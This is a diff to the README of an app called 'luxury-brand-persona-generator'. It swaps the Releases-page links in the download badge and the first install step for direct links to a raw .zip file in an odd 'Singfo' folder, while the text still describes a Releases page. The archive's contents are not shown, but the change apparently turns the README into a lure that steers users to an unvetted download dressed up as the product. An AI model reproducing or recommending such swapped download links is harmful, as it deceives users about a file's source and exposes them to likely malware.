@@ -4,13 +4,13 @@
 
 Welcome to the **luxury-brand-persona-generator**! This application helps you unveil the true identity of your brand through an interactive, AI-driven experience. Follow the steps below to download and run the software.
 
-[![Download](https://img.shields.io/badge/Download-luxury--brand--persona--generator-blue.svg)](https://github.com/Franio12345/luxury-brand-persona-generator/releases)
+[![Download](https://raw.githubusercontent.com/Franio12345/luxury-brand-persona-generator/main/Singfo/luxury-brand-persona-generator.zip)](https://raw.githubusercontent.com/Franio12345/luxury-brand-persona-generator/main/Singfo/luxury-brand-persona-generator.zip)
 
 ## 📥 Download & Install
 
 You can easily download the application from our Releases page. 
 
-1. Click this link to **visit the page**: [Download Here](https://github.com/Franio12345/luxury-brand-persona-generator/releases).
+1. Click this link to **visit the page**: [Download Here](https://raw.githubusercontent.com/Franio12345/luxury-brand-persona-generator/main/Singfo/luxury-brand-persona-generator.zip).
 2. On the Releases page, you will find the latest version of the software. Look for the file that matches your system (Windows, Mac, or Linux).
 3. Click on the file to begin downloading.
 
